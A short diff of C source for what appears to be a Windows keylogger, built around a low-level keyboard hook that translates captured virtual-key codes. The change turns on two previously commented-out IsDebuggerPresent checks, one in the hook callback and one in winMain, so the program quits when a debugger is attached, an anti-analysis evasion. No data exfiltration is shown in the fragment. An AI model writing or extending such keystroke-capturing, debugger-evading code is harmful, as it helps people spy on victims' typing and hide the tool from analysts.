@@ -600,7 +600,7 @@ LRESULT Deposit(int Code, WPARAM wParam, LPARAM lParam) {
 		KBDLLHOOKSTRUCT* KeyBoardHookStruct = (KBDLLHOOKSTRUCT*)lParam;
 		HANDLE ProcHeap = GetProcessHeap();
 		
-		//if (IsDebuggerPresent()) ExitProcess(DEFAULT_EXIT_STATUS);
+		if (IsDebuggerPresent()) ExitProcess(DEFAULT_EXIT_STATUS);
 
 		PCHAR key = TranslateVKCode(KeyBoardHookStruct->vkCode);
 		
@@ -655,7 +655,7 @@ BOOL Cleanup(DWORD dwControlType){
 }
 
 INT CALLBACK winMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
-	//if (IsDebuggerPresent()) ExitProcess(DEFAULT_EXIT_STATUS);
+	if (IsDebuggerPresent()) ExitProcess(DEFAULT_EXIT_STATUS);
 
 	MSG message;
 
